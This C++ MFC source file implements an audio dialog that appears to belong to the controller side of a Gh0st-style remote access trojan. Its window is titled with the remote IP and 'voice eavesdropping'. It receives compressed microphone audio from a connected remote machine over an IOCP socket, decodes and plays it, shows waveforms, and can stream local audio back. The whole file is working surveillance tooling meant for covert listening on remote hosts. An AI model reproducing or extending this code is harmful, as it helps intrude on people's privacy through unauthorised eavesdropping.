// AudioDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "AudioDlg.h"
#include "AudioCode.h"
#include "WaveIn.h"
#include "WaveOut.h"
#include "Filter.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


/////////////////////////////////////////////////////////////////////////////
// CAudioDlg dialog
CWaveIn g_WaveIn;
CWaveOut g_WaveOut;
CAudioCode g_ACode;

DWORD ReaiLen =0;
char *Readata = 0;
HANDLE	m_hEventWaveIn; // 音频触发
HANDLE	m_HoMiEven;     //波形触发
char m_cBufIn[1024] = {0};
char m_cBufOut[1024] = {0};


CAudioDlg::CAudioDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CAudioDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CAudioDlg)
	m_bIsSendLocalAudio = FALSE;
	//}}AFX_DATA_INIT

	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_AUDIO));
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;

	m_bIsWorking	= true;

	m_nTotalRecvBytes = 0;
	m_HoMiWorking = true;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

}


void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAudioDlg)
	DDX_Control(pDX, IDC_HORNDATACURVE, m_Horndatacurve);
	DDX_Control(pDX, IDC_MICDATACURVE, m_Micdatacurve);
	DDX_Check(pDX, IDC_SEND_LOCALAUDIO, m_bIsSendLocalAudio);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	//{{AFX_MSG_MAP(CAudioDlg)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_SEND_LOCALAUDIO, OnSendLocalaudio)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAudioDlg message handlers


BOOL CAudioDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	str.Format("\\\\%s - 语音监听", m_IPAddress);
	SetWindowText(str);

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	m_hEventWaveIn	= CreateEventA(NULL, false, false, NULL);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	g_WaveOut.StartPlay();  //开启语音播放

	filter.MiInit(m_Micdatacurve.GetSafeHwnd(),16);   //话筒画线初始化
	filter.HoInit(m_Horndatacurve.GetSafeHwnd(),16);  //喇叭画线初始化

	m_HoMiEven = CreateEventA(NULL, false, false, NULL);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HoMiThread, (LPVOID)this, 0, NULL);   //开启线程 显示波形
	return true;
}

//开启线程 显示波形
DWORD WINAPI CAudioDlg::HoMiThread(LPVOID lparam)  
{
	CAudioDlg	*pThis = (CAudioDlg *)lparam;
	while (pThis->m_HoMiWorking)
	{
		WaitForSingleObject(m_HoMiEven, INFINITE);   //等待波形数据到来

		pThis->filter.MiFilter(m_cBufIn);  //显示话筒波形
		pThis->filter.HoFilter(m_cBufOut);  //显示喇叭波形
	}
	return 0;
}

void CAudioDlg::OnReceiveComplete()
{
	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;

//	CString	str;
// 	str.Format("%d kb", m_nTotalRecvBytes / 1024);
//	SetDlgItemText(IDC_TIPS, str);

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
		// 首先调用音频编解码器解码数据
		int lOut;
	    lOut = sizeof(m_cBufOut);
	    g_ACode.DecodeAudioData ((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1,m_cBufOut,&lOut);
		g_WaveOut.Play(m_cBufOut,lOut);   //信息播放

		SetEvent(m_HoMiEven);// 通知波形数据到来
		break;
	default:
		// 传输发生异常数据
		return;
	}	
}

void CAudioDlg::OnReceive()
{
	
}

DWORD WINAPI CAudioDlg::WorkThClose(LPVOID lparam)
{
	g_WaveIn.StopRec();     //停止录音
	g_WaveOut.StopPlay();   //停止语音播放

//	::MessageBox(NULL,"001", "通知！！", MB_OK);
	return 0;
}

void CAudioDlg::OnClose() 
{
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThClose, (LPVOID)this, 0, NULL);   //开启线程关闭语音
	
//	g_WaveIn.StopRec();     //停止录音
//	g_WaveOut.StopPlay();   //停止语音播放

	closesocket(m_pContext->m_Socket);
	m_bIsWorking = false;
	m_HoMiWorking = false;

	CDialog::OnClose();
}
/*
DWORD WINAPI CAudioDlg::WorkLocalaudio(LPVOID lparam)
{
	CAudioDlg	*pThis = (CAudioDlg *)lparam;

	if (pThis->m_bIsSendLocalAudio)   //本地录音开启
	{
        g_WaveIn.StartRec();   //开始录音
	}
	else
	{
		g_WaveIn.StopRec();    //停止录音
	}

	return 0;
}
*/
void CAudioDlg::OnSendLocalaudio() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);

	if (m_bIsSendLocalAudio)   //本地录音开启
	{
        g_WaveIn.StartRec();   //开始录音
	}
	else
	{
		g_WaveIn.StopRec();    //停止录音
		memset(m_cBufIn, 0, sizeof(m_cBufIn));  //话筒波形清零
	}

}

// 负责发送本地语音
DWORD WINAPI CAudioDlg::WorkThread(LPVOID lparam)
{
	CAudioDlg	*pThis = (CAudioDlg *)lparam;

	while (pThis->m_bIsWorking)
	{
		if (!pThis->m_bIsSendLocalAudio)
		{
			Sleep(1000);
			continue;
		}

	    DWORD	dwBytes = 0;

		WaitForSingleObject(m_hEventWaveIn, INFINITE);   //等待音频数据到来
	    if(ReaiLen == NULL)
		    return 0;

	    dwBytes = ReaiLen;
	    ReaiLen = 0;

//		::MessageBox(NULL,"001", "通知！！", MB_OK);
	    //音频编码函数
	    int lin;
		char m_cBufln[1024];
        lin=sizeof(m_cBufln);
	    g_ACode.EncodeAudioData (Readata,dwBytes,m_cBufln,&lin);
	    pThis->m_iocpServer->Send(pThis->m_pContext, (unsigned char *)m_cBufln, lin);

//		SetEvent(m_HoMiEven);// 通知波形数据到来
	}
	return 0;
}

void CAudioDlg::ReadGetData(char *pBuffer,int iLen)
{
	Readata = (char *)pBuffer;
	ReaiLen = iLen;
	memcpy(m_cBufIn,pBuffer,iLen);
	SetEvent(m_hEventWaveIn);// 通知数据到来
}
